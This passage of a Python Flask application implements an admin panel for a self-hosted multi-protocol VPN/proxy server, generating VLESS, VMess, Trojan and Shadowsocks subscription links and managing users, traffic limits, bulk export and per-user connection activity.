    user_key = _ss2022_user_key(user_uuid, method)
    port = s.get("ss2022_port", 2056)
    address = _config_host(server_ip)
    # SS2022 URI: ss://base64(method:server_key:user_key)@host:port#name
    userinfo = base64.urlsafe_b64encode(f"{method}:{server_key}:{user_key}".encode()).decode().rstrip("=")
    return f"ss://{userinfo}@{address}:{port}#{urllib.parse.quote(f'{prefix}-SS-{name}')}"


def vless_ws_link(name, user_uuid, server_ip=None):
    s = settings
    if not s.get("vless_ws_enabled"):
        return ""
    prefix = s.get("config_prefix") or "Proxy"
    sni = s.get("vmess_sni") or SNI_HOST
    port = s.get("vless_ws_port", 2057)
    ws_path = s.get("vless_ws_path") or "/vless-ws"
    fp = s.get("fingerprint", "chrome")
    address = _config_host(server_ip)
    params = urllib.parse.urlencode({
        "security": "tls",
        "encryption": "none",
        "type": "ws",
        "host": sni,
        "path": ws_path,
        "sni": sni,
        "fp": fp,
        "allowInsecure": "1",
    })
    return f"vless://{user_uuid}@{address}:{port}?{params}#{prefix}-VWS-{name}"


def vless_xhttp_link(name, user_uuid, server_ip=None):
    s = settings
    if not s.get("vless_xhttp_enabled"):
        return ""
    pbk = s.get("vless_xhttp_reality_public_key", "")
    if not pbk:
        return ""
    prefix = s.get("config_prefix") or "Proxy"
    sni = s.get("vless_xhttp_reality_sni", "digikala.com")
    port = s.get("vless_xhttp_port", 2053)
    pbk = s.get("vless_xhttp_reality_public_key", "")
    sid = s.get("vless_xhttp_reality_short_id", "")
    path = s.get("vless_xhttp_path", "/xhttp-stream")
    mode = s.get("vless_xhttp_mode", "auto")
    fp = s.get("fingerprint", "chrome")
    address = _config_host(server_ip)
    params = urllib.parse.urlencode({
        "security": "reality",
        "encryption": "none",
        "pbk": pbk,
        "headerType": "none",
        "fp": fp,
        "type": "xhttp",
        "sni": sni,
        "sid": sid,
        "path": path,
        "host": sni,
        "mode": mode,
    })
    return f"vless://{user_uuid}@{address}:{port}?{params}#{prefix}-XHTTP-{name}"


def vless_vision_link(name, user_uuid, server_ip=None):
    s = settings
    if not s.get("vless_vision_enabled"):
        return ""
    pbk = s.get("vless_vision_reality_public_key", "")
    if not pbk:
        return ""
    prefix = s.get("config_prefix") or "Proxy"
    sni = s.get("vless_vision_reality_sni", "objects.githubusercontent.com")
    port = s.get("vless_vision_port", 2058)
    pbk = s.get("vless_vision_reality_public_key", "")
    sid = s.get("vless_vision_reality_short_id", "")
    flow = s.get("vless_vision_flow", "xtls-rprx-vision")
    fp = s.get("fingerprint", "chrome")
    address = _config_host(server_ip)
    params = urllib.parse.urlencode({
        "security": "reality",
        "encryption": "none",
        "pbk": pbk,
        "headerType": "none",
        "fp": fp,
        "type": "tcp",
        "sni": sni,
        "sid": sid,
        "flow": flow,
    })
    return f"vless://{user_uuid}@{address}:{port}?{params}#{prefix}-Vision-{name}"


def vless_reverse_link(name, user_uuid, server_ip=None):
    s = settings
    if not s.get("vless_reverse_enabled"):
        return ""
    pbk = s.get("vless_reverse_reality_public_key", "")
    if not pbk:
        return ""
    prefix = s.get("config_prefix") or "Proxy"
    sni = s.get("vless_reverse_reality_sni", "digikala.com")
    port = s.get("vless_reverse_port", 2059)
    pbk = s.get("vless_reverse_reality_public_key", "")
    sid = s.get("vless_reverse_reality_short_id", "")
    fp = s.get("fingerprint", "chrome")
    address = _config_host(server_ip)
    params = urllib.parse.urlencode({
        "security": "reality",
        "encryption": "none",
        "pbk": pbk,
        "headerType": "none",
        "fp": fp,
        "type": "tcp",
        "sni": sni,
        "sid": sid,
    })
    return f"vless://{user_uuid}@{address}:{port}?{params}#{prefix}-Reverse-{name}"


def trojan_cdn_link(name, user_uuid, server_ip=None):
    s = settings
    if not s.get("trojan_cdn_enabled"):
        return ""
    prefix = s.get("config_prefix") or "Proxy"
    sni = s.get("trojan_cdn_sni", "")
    port = s.get("trojan_cdn_port", 2083)
    path = s.get("trojan_cdn_ws_path", "/trojan-ws")
    host = s.get("trojan_cdn_domain", "")
    tls = "tls" if s.get("trojan_cdn_tls_enabled", True) else "none"
    fp = s.get("fingerprint", "chrome")
    address = host if host else _config_host(server_ip)
    params = urllib.parse.urlencode({
        "security": tls,
        "type": "ws",
        "headerType": "none",
        "sni": sni,
        "host": host,
        "path": path,
        "fp": fp,
        "allowInsecure": "1",
    })
    return f"trojan://{user_uuid}@{address}:{port}?{params}#{prefix}-Trojan-CDN-{name}"
def _all_links(name, user_uuid, server_ip=None):
    """Return dict of all available config links for a user."""
    links = {"vmess": vmess_link(name, user_uuid, server_ip)}
    for key, fn in [
        ("vless", vless_link), ("cdn_vmess", cdn_vmess_link),
        ("trojan", trojan_link), ("grpc_vmess", grpc_vmess_link),
        ("httpupgrade_vmess", httpupgrade_vmess_link),
        ("ss2022", ss2022_link), ("vless_ws", vless_ws_link),
        ("vless_xhttp", vless_xhttp_link), ("vless_vision", vless_vision_link),
        ("vless_reverse", vless_reverse_link), ("trojan_cdn", trojan_cdn_link),
    ]:
        val = fn(name, user_uuid, server_ip)
        if val:
            links[key] = val
            
    engine = get_protocol_engine(settings)
    standalone_keys = [
        ("hysteria2", "hysteria2"),
        ("tuic", "tuic_v5"),
        ("amneziawg", "amneziawg"),
        ("shadowtls", "shadowtls_v3"),
        ("mieru", "mieru"),
        ("naiveproxy", "naiveproxy"),
        ("wireguard", "wireguard"),
        ("openvpn", "openvpn"),
    ]
    for setting_prefix, proto_key in standalone_keys:
        if settings.get(f"{setting_prefix}_enabled"):
            try:
                links[setting_prefix] = engine.generate_subscription_link(proto_key, user_uuid, settings)
            except Exception as e:
                logger.error(f"Failed to generate link for {proto_key}: {e}")
                
    return links


# ── Static: official Android APK ───────────────────────
APK_STATIC = "downloads/app-release.apk"


def apk_available_check():
    return os.path.isfile(os.path.join(app.root_path, "static", APK_STATIC))


# ── Routes ─────────────────────────────────────────────

@app.route("/download/app")
def download_app():
    apk_path = os.path.join(app.root_path, "static", APK_STATIC)
    if not os.path.isfile(apk_path):
        return "File not found", 404
    return send_file(apk_path, as_attachment=True, download_name="vpn-app.apk")


@app.route("/download/app-windows")
def download_app_windows():
    win_path = os.path.join(app.root_path, "static", "downloads", "vpn-windows.zip")
    if os.path.isfile(win_path):
        return send_file(win_path, as_attachment=True, download_name="vpn-windows.zip")
    return "Windows build not uploaded on this server yet.", 404


@app.route("/")
def index():
    return render_template(
        "panel.html",
        server_ip=SERVER_IP, server_port=SERVER_PORT,
        sni_host=SNI_HOST, ws_path=WS_PATH,
        apk_available=apk_available_check(),
    )


@app.route("/sub/<user_uuid>")
def subscription_page(user_uuid):
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "SELECT name, uuid, traffic_limit_gb, traffic_used_gb, expire_at, active, created_at FROM users WHERE uuid=?",
        (user_uuid,),
    )
    row = c.fetchone()
    conn.close()
    if not row:
        return "Not found", 404
    # Live stats for online connections
    live = query_v2ray_stats(reset=False)
    user_live = live.get(row["name"], {"up": 0, "down": 0})
    online_ips = _count_online_ips(row["name"])
    # Build links
    public_host = _request_config_host()
    links = _all_links(row["name"], row["uuid"], public_host)
    return render_template(
        "sub.html",
        user=dict(row),
        links=links,
        live_up=user_live["up"],
        live_down=user_live["down"],
        online_ips=online_ips,
        server_ip=public_host,
        server_port=SERVER_PORT,
        sni_host=SNI_HOST,
        ws_path=WS_PATH,
        settings=settings,
        apk_available=apk_available_check(),
    )


@app.route("/sub-api/<user_uuid>")
def subscription_api(user_uuid):
    """Return subscription links as plain text for V2Ray/Clash import."""
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT name, uuid, active, traffic_used_gb, traffic_limit_gb FROM users WHERE uuid=?", (user_uuid,))
    row = c.fetchone()
    conn.close()
    if not row or not row["active"]:
        return "Not found", 404
    links = _all_links(row["name"], row["uuid"], _request_config_host())
    lines = list(links.values())
    content = "\n".join(lines)
    encoded = base64.b64encode(content.encode()).decode()
    resp = app.make_response(encoded)
    resp.headers["Content-Type"] = "text/plain; charset=utf-8"
    resp.headers["Content-Disposition"] = f"inline; filename={row['name']}.txt"
    resp.headers["Profile-Update-Interval"] = "6"
    resp.headers["Subscription-Userinfo"] = (
        f"upload=0; download={int((row['traffic_used_gb'] or 0) * 1073741824)}; "
        f"total={int((row['traffic_limit_gb'] or 0) * 1073741824)}"
    )
    return resp


_FROM_IP_RE = re.compile(r"from (?:tcp:|udp:)?(\d+\.\d+\.\d+\.\d+):\d+")
_EMAIL_RE = re.compile(r"email:\s*@?([\w._-]+)@vpn")


def _count_online_ips(username):
    """Count unique source IPs seen for this username in the last ~90 seconds of access log."""
    email = username + "@vpn"
    try:
        if not os.path.exists(ACCESS_LOG):
            return 0, set()
        size = os.path.getsize(ACCESS_LOG)
        read_bytes = min(size, 2 * 1024 * 1024)
        with open(ACCESS_LOG, "r", errors="ignore") as f:
            if size > read_bytes:
                f.seek(size - read_bytes)
                f.readline()
            lines = f.readlines()

        cutoff = datetime.now() - timedelta(seconds=90)
        cutoff_str = cutoff.strftime("%Y/%m/%d %H:%M:%S")
        ips = set()
        for line in lines:
            if email not in line or "accepted" not in line:
                continue
            ts_part = line[:19]
            if ts_part < cutoff_str:
                continue
            m = _FROM_IP_RE.search(line)
            if m:
                ips.add(m.group(1))
        return len(ips), ips
    except Exception:
        return 0, set()


def _count_all_online_ips():
    """Batch-count unique source IPs per user from last ~90s of access log. Returns {username: set(ips)}."""
    result = {}
    try:
        if not os.path.exists(ACCESS_LOG):
            return result
        size = os.path.getsize(ACCESS_LOG)
        read_bytes = min(size, 2 * 1024 * 1024)
        with open(ACCESS_LOG, "r", errors="ignore") as f:
            if size > read_bytes:
                f.seek(size - read_bytes)
                f.readline()
            lines = f.readlines()

        cutoff = datetime.now() - timedelta(seconds=90)
        cutoff_str = cutoff.strftime("%Y/%m/%d %H:%M:%S")
        for line in lines:
            if "accepted" not in line:
                continue
            ts_part = line[:19]
            if ts_part < cutoff_str:
                continue
            em = _EMAIL_RE.search(line)
            if not em:
                continue
            username = em.group(1)
            ip_m = _FROM_IP_RE.search(line)
            if ip_m:
                result.setdefault(username, set()).add(ip_m.group(1))
    except Exception:
        pass
    return result


@app.route("/api/login", methods=["POST"])
def login():
    global PANEL_PASSWORD_HASH
    ip = _get_client_ip()
    if _is_locked_out(ip):
        remaining = LOCKOUT_SECONDS - (time.time() - min(_login_attempts[ip]))
        return jsonify({"error": f"Too many attempts. Try again in {int(remaining // 60)+1} min",
                        "locked": True}), 429
    data = request.get_json(silent=True) or {}
    pw = data.get("password", "")
    if _hash_pw(pw) == PANEL_PASSWORD_HASH:
        _clear_attempts(ip)
        session.permanent = True
        session["auth"] = True
        session["login_ip"] = ip
        session["login_time"] = time.time()
        return jsonify({"ok": True})
    _record_failed_attempt(ip)
    left = _remaining_attempts(ip)
    msg = "Wrong password"
    if left <= 2:
        msg += f" ({left} attempt{'s' if left != 1 else ''} remaining)"
    return jsonify({"error": msg, "remaining": left}), 401


@app.route("/api/logout", methods=["POST"])
@require_auth
def logout():
    session.clear()
    return jsonify({"ok": True})


@app.route("/api/users")
@require_auth
def api_users():
    check_limits_with_live()
    kill_switch_check()

    live = query_v2ray_stats(reset=False)
    ip_map = _count_all_online_ips()
    conn = get_db()
    c = conn.cursor()
    c.execute(
        """SELECT name, uuid, traffic_limit_gb, traffic_used_gb,
                  expire_at, active, created_at, speed_limit_up, speed_limit_down,
                  COALESCE(note, '') AS note
           FROM users ORDER BY active DESC, name"""
    )
    rows = c.fetchall()
    conn.close()

    users = []
    s = settings
    public_host = _request_config_host()
    for r in rows:
        live_data = live.get(r["name"], {"up": 0, "down": 0})
        live_bytes = live_data["up"] + live_data["down"]
        total_used_gb = r["traffic_used_gb"] + live_bytes / (1024**3)
        expire = datetime.fromisoformat(r["expire_at"])
        days_left = (expire - datetime.now()).days
        pct = (
            round(min((total_used_gb / r["traffic_limit_gb"]) * 100, 100), 1)
            if r["traffic_limit_gb"] > 0
            else 0
        )
        total_used_bytes = int(r["traffic_used_gb"] * (1024**3)) + live_bytes
        limit_bytes = int(r["traffic_limit_gb"] * (1024**3))
        user_ips = ip_map.get(r["name"], set())

        u = {
            "name": r["name"], "uuid": r["uuid"],
            "traffic_limit": r["traffic_limit_gb"],
            "traffic_limit_bytes": limit_bytes,
            "traffic_used": total_used_gb,
            "traffic_used_bytes": total_used_bytes,
            "traffic_percent": pct,
            "expire_at": r["expire_at"][:10],
            "days_left": days_left,
            "active": bool(r["active"]),
            "created_at": r["created_at"][:10] if r["created_at"] else "",
            "live_up": live_data["up"],
            "live_down": live_data["down"],
            "speed_limit_up": r["speed_limit_up"] or 0,
            "speed_limit_down": r["speed_limit_down"] or 0,
            "online_ip_count": len(user_ips),
            "online_ips": sorted(user_ips),
            "note": (r["note"] or "").strip(),
        }
        u.update(_all_links(r["name"], r["uuid"], public_host))
        users.append(u)
    return jsonify(users)


@app.route("/api/groups")
@require_auth
def api_groups():
    """Return grouped users by name pattern prefix-gb-###."""
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT name, active, traffic_limit_gb, expire_at FROM users ORDER BY created_at DESC")
    rows = c.fetchall()
    conn.close()

    groups = {}
    for r in rows:
        gid = _parse_group_id(r["name"])
        if not gid:
            continue
        g = groups.setdefault(gid, {
            "id": gid,
            "count": 0,
            "active": 0,
            "disabled": 0,
            "traffic_gb": r["traffic_limit_gb"],
            "latest_expire": r["expire_at"] or "",
        })
        g["count"] += 1
        if r["active"]:
            g["active"] += 1
        else:
            g["disabled"] += 1
        if r["expire_at"] and (not g["latest_expire"] or r["expire_at"] > g["latest_expire"]):
            g["latest_expire"] = r["expire_at"]

    # sort by newest expire first, then id
    out = sorted(groups.values(), key=lambda x: (x.get("latest_expire") or "", x["id"]), reverse=True)
    return jsonify(out)


@app.route("/api/groups/<group_id>/users")
@require_auth
def api_group_users(group_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT name, uuid, traffic_limit_gb, traffic_used_gb, expire_at, active, created_at FROM users ORDER BY name ASC")
    rows = c.fetchall()
    conn.close()

    has_vless = bool(settings.get("reality_public_key"))
    has_cdn = settings.get("cdn_enabled") and bool(settings.get("cdn_domain"))
    public_host = _request_config_host()
    out = []
    for r in rows:
        if _parse_group_id(r["name"]) != group_id:
            continue
        u = {
            "name": r["name"],
            "uuid": r["uuid"],
            "traffic_limit": float(r["traffic_limit_gb"] or 0),
            "expire_at": (r["expire_at"] or "")[:10],
            "active": bool(r["active"]),
            "vmess": vmess_link(r["name"], r["uuid"], public_host),
        }
        if has_vless:
            u["vless"] = vless_link(r["name"], r["uuid"], public_host)
        if has_cdn:
            u["cdn_vmess"] = cdn_vmess_link(r["name"], r["uuid"], public_host)
        out.append(u)
    return jsonify({"ok": True, "group": group_id, "count": len(out), "users": out})


@app.route("/api/live")
@require_auth
def api_live():
    return jsonify(query_v2ray_stats(reset=False))


@app.route("/api/users", methods=["POST"])
@require_auth
def api_add_user():
    data = request.json
    name = data.get("name", "").strip()
    traffic = float(data.get("traffic", 0))
    days = int(data.get("days", 30))
    speed_up = int(data.get("speed_limit_up", 0))
    speed_down = int(data.get("speed_limit_down", 0))
    note = (data.get("note") or "").strip()[:500]
    if not name or traffic <= 0 or days <= 0:
        return jsonify({"error": "Invalid data"}), 400
    user_uuid = str(uuid_lib.uuid4())
    expire = (datetime.now() + timedelta(days=days)).isoformat()
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute(
            "INSERT INTO users (name,uuid,traffic_limit_gb,expire_at,created_at,speed_limit_up,speed_limit_down,note) VALUES (?,?,?,?,?,?,?,?)",
            (name, user_uuid, traffic, expire, datetime.now().isoformat(), speed_up, speed_down, note),
        )
        conn.commit()
        conn.close()
        apply_changes()
        return jsonify({"ok": True, "vmess": vmess_link(name, user_uuid, _request_config_host())})
    except sqlite3.IntegrityError:
        return jsonify({"error": "User already exists"}), 409


@app.route("/api/bulk-users", methods=["POST"])
@require_auth
def api_bulk_users():
    data = _normalize_settings_types(request.json or {})
    try:
        count = int(data.get("count", 10))
        traffic = float(data.get("traffic", 1))
        days = int(data.get("days", 30))
        prefix = data.get("prefix", "group")
        numbered = bool(data.get("numbered", True))
        start = int(data.get("start", 1))
        pad = int(data.get("pad", 3))
        apply_now = bool(data.get("apply", False))
        speed_up = int(data.get("speed_limit_up", 0))
        speed_down = int(data.get("speed_limit_down", 0))

        rows = _bulk_generate_users(prefix, count, traffic, days, numbered=numbered, start=start, pad=pad, speed_limit_up=speed_up, speed_limit_down=speed_down)
        out = []
        has_vless = bool(settings.get("reality_public_key"))
        has_cdn = settings.get("cdn_enabled") and bool(settings.get("cdn_domain"))
        public_host = _request_config_host()
        for name, user_uuid in rows:
            u = {"name": name, "uuid": user_uuid, "vmess": vmess_link(name, user_uuid, public_host)}
            if has_vless:
                u["vless"] = vless_link(name, user_uuid, public_host)
            if has_cdn:
                u["cdn_vmess"] = cdn_vmess_link(name, user_uuid, public_host)
            out.append(u)

        if apply_now:
            apply_changes()

        return jsonify({
            "ok": True,
            "created": len(out),
            "apply": apply_now,
            "numbered": numbered,
            "start": start,
            "pad": pad,
            "traffic_gb": traffic,
            "days": days,
            "note": (
                "Created in database only. Click Sync/Apply later to activate on server (no disruption now)."
                if not apply_now else
                "Created and applied to server."
            ),
            "users": out,
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 400


def _safe_zip_stem(username: str, used: dict) -> str:
    """Filesystem-safe base name for a .txt inside the zip (no path segments)."""
    s = re.sub(r"[^a-zA-Z0-9._-]+", "_", (username or "").strip()).strip("._")
    if not s:
        s = "user"
    s = s[:100]
    stem = s
    n = 1
    while stem in used:
        n += 1
        stem = f"{s[:85]}_{n}"
    used[stem] = True
    return stem


def _user_export_txt_body(name: str, vmess: str, vless: str, cdn_vmess: str,
                         trojan: str = "", grpc_vmess: str = "",
                         httpupgrade_vmess: str = "", ss2022: str = "",
                         vless_ws: str = "") -> str:
    lines = [
        f"# Username: {name}",
        "#",
        "# Paste each link into your client as needed.",
        "",
    ]
    for label, val in [
        ("VMess", vmess), ("VLESS", vless), ("CDN (VMess)", cdn_vmess),
        ("Trojan", trojan), ("gRPC (VMess)", grpc_vmess),
        ("HTTPUpgrade (VMess)", httpupgrade_vmess),
        ("ShadowSocks 2022", ss2022), ("VLESS-WS", vless_ws),
    ]:
        v = str(val or "").strip()
        if v:
            lines.extend([f"=== {label} ===", v, ""])
    return "\n".join(lines).rstrip() + "\n"


@app.route("/api/bulk-export-zip", methods=["POST"])
@require_auth
def api_bulk_export_zip():
    """One .txt per user + combined file, inside a single .zip download."""
    data = request.json or {}
    users = data.get("users")
    if not isinstance(users, list) or not users:
        return jsonify({"error": "users must be a non-empty list"}), 400
    if len(users) > 2000:
        return jsonify({"error": "Too many users"}), 400

    prefix = (data.get("prefix") or "bulk").strip() or "bulk"
    prefix_safe = re.sub(r"[^a-zA-Z0-9._-]+", "_", prefix)[:80] or "bulk"

    buf = io.BytesIO()
    used_stems: dict = {}
    combined_chunks: list = []
    written = 0

    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        readme_lines = [
            "VPN — bulk export",
            "",
            f"Group / prefix: {prefix}",
            f"User count: {len(users)}",
            f"Exported (server time): {datetime.now().isoformat(timespec='seconds')}",
            "",
            "This ZIP contains:",
            "  • One .txt file per user (VMess / VLESS / CDN lines, separated clearly).",
            "  • ALL-CONFIGS.txt — every user in one file with big dividers.",
            "",
        ]
        zf.writestr("00-README.txt", "\n".join(readme_lines) + "\n")

        for u in users:
            if not isinstance(u, dict):
                continue
            raw_name = u.get("name")
            if not isinstance(raw_name, str) or not raw_name.strip():
                continue
            name = raw_name.strip()
            _g = lambda k: str(u.get(k) or "").strip()
            body = _user_export_txt_body(
                name, _g("vmess"), _g("vless"), _g("cdn_vmess"),
                trojan=_g("trojan"), grpc_vmess=_g("grpc_vmess"),
                httpupgrade_vmess=_g("httpupgrade_vmess"),
                ss2022=_g("ss2022"), vless_ws=_g("vless_ws"),
            )
            stem = _safe_zip_stem(name, used_stems)
            zf.writestr(f"{stem}.txt", body)
            written += 1
            combined_chunks.append(
                "\n".join(
                    [
                        "",
                        "#" * 72,
                        f"# USER: {name}",
                        "#" * 72,
                        "",
                        body.rstrip(),
                        "",
                    ]
                )
            )

        if not written:
            return jsonify({"error": "No valid users to export"}), 400

        all_text = (
            f"# ALL CONFIGS — prefix: {prefix}\n"
            f"# {written} user(s)\n"
            f"# Same content as individual .txt files, concatenated.\n"
        )
        all_text += "\n".join(combined_chunks)
        zf.writestr("ALL-CONFIGS.txt", all_text.rstrip() + "\n")

    buf.seek(0)
    return send_file(
        buf,
        mimetype="application/zip",
        as_attachment=True,
        download_name=f"{prefix_safe}-vpn-configs.zip",
    )


@app.route("/api/bulk-delete", methods=["POST"])
@require_auth
def api_bulk_delete():
    data = request.json or {}
    names = data.get("names") or []
    prefix = (data.get("prefix") or "").strip()
    apply_now = bool(data.get("apply", False))

    if not isinstance(names, list):
        return jsonify({"error": "names must be a list"}), 400
    if len(names) > 2000:
        return jsonify({"error": "Too many names"}), 400

    conn = get_db()
    c = conn.cursor()
    deleted = 0

    try:
        if names:
            # Exact delete list
            for nm in names:
                if not isinstance(nm, str):
                    continue
                nm = nm.strip()
                if not nm:
                    continue
                c.execute("DELETE FROM users WHERE name=?", (nm,))
                deleted += c.rowcount
        elif prefix:
            # Prefix-based delete (safe: only prefix-*)
            safe_prefix = re.sub(r"[^a-zA-Z0-9_-]+", "-", prefix).strip("-")
            if not safe_prefix:
                conn.close()
                return jsonify({"error": "Invalid prefix"}), 400
            c.execute("DELETE FROM users WHERE name LIKE ?", (safe_prefix + "-%",))
            deleted = c.rowcount
        else:
            conn.close()
            return jsonify({"error": "Provide names[] or prefix"}), 400

        conn.commit()
        conn.close()
    except Exception as e:
        conn.rollback()
        conn.close()
        return jsonify({"error": str(e)}), 400

    if apply_now and deleted > 0:
        apply_changes()

    return jsonify({"ok": True, "deleted": deleted, "apply": apply_now})


@app.route("/api/users/<name>", methods=["DELETE"])
@require_auth
def api_delete_user(name):
    conn = get_db()
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE name=?", (name,))
    affected = c.rowcount
    conn.commit()
    conn.close()
    if affected:
        apply_changes()
        return jsonify({"ok": True})
    return jsonify({"error": "User not found"}), 404


@app.route("/api/users/<name>/toggle", methods=["POST"])
@require_auth
def api_toggle_user(name):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT active FROM users WHERE name=?", (name,))
    row = c.fetchone()
    if not row:
        conn.close()
        return jsonify({"error": "User not found"}), 404
    new_state = 0 if row["active"] else 1
    c.execute("UPDATE users SET active=? WHERE name=?", (new_state, name))
    conn.commit()
    conn.close()
    apply_changes()
    label = "enabled" if new_state else "disabled"
    return jsonify({"ok": True, "active": bool(new_state), "message": f"{name} {label}"})


@app.route("/api/users/<name>/renew", methods=["POST"])
@require_auth
def api_renew_user(name):
    data = request.json
    traffic = float(data.get("traffic", 0))
    days = int(data.get("days", 30))
    if traffic <= 0 or days <= 0:
        return jsonify({"error": "Invalid data"}), 400
    expire = (datetime.now() + timedelta(days=days)).isoformat()
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "UPDATE users SET traffic_limit_gb=?, traffic_used_gb=0, expire_at=?, active=1 WHERE name=?",
        (traffic, expire, name),
    )
    if "speed_limit_up" in data:
        c.execute("UPDATE users SET speed_limit_up=? WHERE name=?", (max(0, int(data["speed_limit_up"])), name))
    if "speed_limit_down" in data:
        c.execute("UPDATE users SET speed_limit_down=? WHERE name=?", (max(0, int(data["speed_limit_down"])), name))
    affected = c.rowcount
    conn.commit()
    conn.close()
    if affected:
        apply_changes()
        return jsonify({"ok": True})
    return jsonify({"error": "User not found"}), 404


@app.route("/api/users/<name>/add-traffic", methods=["POST"])
@require_auth
def api_add_traffic(name):
    """Increase traffic_limit_gb without resetting used traffic or expiry."""
    data = request.json or {}
    try:
        gb = float(data.get("gb", 0))
    except (TypeError, ValueError):
        return jsonify({"error": "Invalid GB amount"}), 400
    if gb <= 0:
        return jsonify({"error": "Invalid GB amount"}), 400
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT traffic_limit_gb FROM users WHERE name=?", (name,))
    row = c.fetchone()
    if not row:
        conn.close()
        return jsonify({"error": "User not found"}), 404
    new_limit = float(row["traffic_limit_gb"] or 0) + gb
    c.execute("UPDATE users SET traffic_limit_gb=? WHERE name=?", (new_limit, name))
    conn.commit()
    conn.close()
    apply_changes()
    return jsonify({"ok": True, "traffic_limit_gb": new_limit})


@app.route("/api/users/<name>/update-note", methods=["POST"])
@require_auth
def api_update_note(name):
    data = request.json or {}
    note = (data.get("note") or "").strip()[:500]
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET note=? WHERE name=?", (note, name))
    affected = c.rowcount
    conn.commit()
    conn.close()
    if not affected:
        return jsonify({"error": "User not found"}), 404
    return jsonify({"ok": True})


@app.route("/api/users/<name>/speed-limit", methods=["POST"])
@require_auth
def api_set_speed_limit(name):
    data = request.json or {}
    up = max(0, int(data.get("speed_limit_up", 0)))
    down = max(0, int(data.get("speed_limit_down", 0)))
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET speed_limit_up=?, speed_limit_down=? WHERE name=?", (up, down, name))
    affected = c.rowcount
    conn.commit()
    conn.close()
    if not affected:
        return jsonify({"error": "User not found"}), 404
    return jsonify({"ok": True, "speed_limit_up": up, "speed_limit_down": down})


@app.route("/api/set-default-speed", methods=["POST"])
@require_auth
def api_set_default_speed():
    data = request.json or {}
    up = max(0, int(data.get("speed_limit_up", 0)))
    down = max(0, int(data.get("speed_limit_down", 0)))
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET speed_limit_up=?, speed_limit_down=?", (up, down))
    affected = c.rowcount
    conn.commit()
    conn.close()
    return jsonify({"ok": True, "speed_limit_up": up, "speed_limit_down": down, "updated": affected})


@app.route("/api/users/<name>/activity")
@require_auth
def api_user_activity(name):
    email = f"{name}@vpn"
    if not os.path.exists(ACCESS_LOG):
        return jsonify({"sites": [], "recent": [], "total": 0})
    try:
        size = os.path.getsize(ACCESS_LOG)
        read_size = min(size, 10 * 1024 * 1024)
        with open(ACCESS_LOG, "r", errors="ignore") as f:
            if size > read_size:
                f.seek(size - read_size)
                f.readline()
            lines = f.readlines()
    except Exception:
        return jsonify({"sites": [], "recent": [], "total": 0})

    user_lines = [l for l in lines if email in l]
    _pat = re.compile(
        r"(\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2})[\.\d]*\s+"
        r".*?(accepted|rejected)\s+"
        r"(\w+):([^:\s]+):(\d+)"
    )
    sites = defaultdict(lambda: {"count": 0, "last": "", "proto": ""})
    recent = []
    for line in user_lines:
        m = _pat.search(line)
        if not m:
            continue
        ts, status, proto, host, port = m.groups()
        if status != "accepted":
            continue
        key = host
        sites[key]["count"] += 1
        sites[key]["last"] = ts
        sites[key]["proto"] = proto
        sites[key]["port"] = port
        recent.append({"time": ts, "host": host, "port": port, "proto": proto})

    sorted_sites = sorted(sites.items(), key=lambda x: x[1]["count"], reverse=True)
    top_hosts = [h for h, _ in sorted_sites[:200]]
    try:
        resolve_geo_batch(top_hosts)
    except Exception:
        pass

    site_list = []
    for h, d in sorted_sites[:200]:
        geo = get_geo(h)
        site_list.append({
            "host": h, "count": d["count"], "last": d["last"],
            "port": d["port"], "proto": d["proto"], "geo": geo,
        })

    alerts = detect_alerts(site_list)
    analysis = build_traffic_analysis(site_list)
    recent_list = recent[-100:]
    recent_list.reverse()
    for r in recent_list:
        r["geo"] = get_geo(r["host"])
        cls = classify_host(r["host"])
        r["service"] = cls["service"]
        r["risk"] = cls["risk"]
    for s in site_list:
        cls = classify_host(s["host"])
        s["service"] = cls["service"]
        s["category"] = cls["category"]
        s["risk"] = cls["risk"]
    deep = build_deep_analysis(site_list, recent)
    return jsonify({"sites": site_list, "recent": recent_list, "total": len(recent),
                    "alerts": alerts, "analysis": analysis, "deep": deep})


@app.route("/api/change-password", methods=["POST"])
@require_auth
def api_change_password():
    global PANEL_PASSWORD_HASH
    data = request.json
    current = data.get("current", "")
    new_pw = data.get("new", "")
    if _hash_pw(current) != PANEL_PASSWORD_HASH:
        return jsonify({"error": "Current password is incorrect"}), 403
    if len(new_pw) < 8:
        return jsonify({"error": "New password must be at least 8 characters"}), 400
    PANEL_PASSWORD_HASH = set_panel_password(new_pw)
    session.clear()
    return jsonify({"ok": True, "message": "Password changed. Please login again."})


@app.route("/api/sync", methods=["POST"])
@require_auth
def api_sync():
    sync_traffic_to_db()
    disabled = check_and_disable()
    write_xray_config()
    return jsonify({"ok": True, "disabled": disabled})


# ── Settings API ───────────────────────────────────────

@app.route("/api/settings")
@require_auth
def api_get_settings():
    s = dict(settings)
    s.pop("reality_private_key", None)
    return jsonify(s)


@app.route("/api/settings", methods=["POST"])
@require_auth
def api_update_settings():
    global settings
    data = request.json or {}
    changed = False
    rebuild = False
    if any(key in data for key in DPI_SETTING_KEYS):
        for key in PROTOCOL_ENABLE_KEYS:
            if settings.get(key) is True and data.get(key) is False:
                data[key] = True

    for key in ["cdn_enabled", "cdn_domain", "cdn_ws_path", "cdn_port",
                "kill_switch_enabled", "backup_retention_days",
                "reality_dest", "reality_sni", "vless_port",
                "config_prefix", "vmess_port", "vmess_sni", "vmess_ws_path",
                "trojan_enabled", "trojan_port",
                "grpc_enabled", "grpc_port", "grpc_service_name",
                "httpupgrade_enabled", "httpupgrade_port", "httpupgrade_path",
                "fragment_enabled", "fragment_packets", "fragment_length", "fragment_interval",
                "mux_enabled", "mux_concurrency",
                "ss2022_enabled", "ss2022_port", "ss2022_method",
                "vless_ws_enabled", "vless_ws_port", "vless_ws_path",
                "fingerprint", "noise_enabled", "noise_packet", "noise_delay",
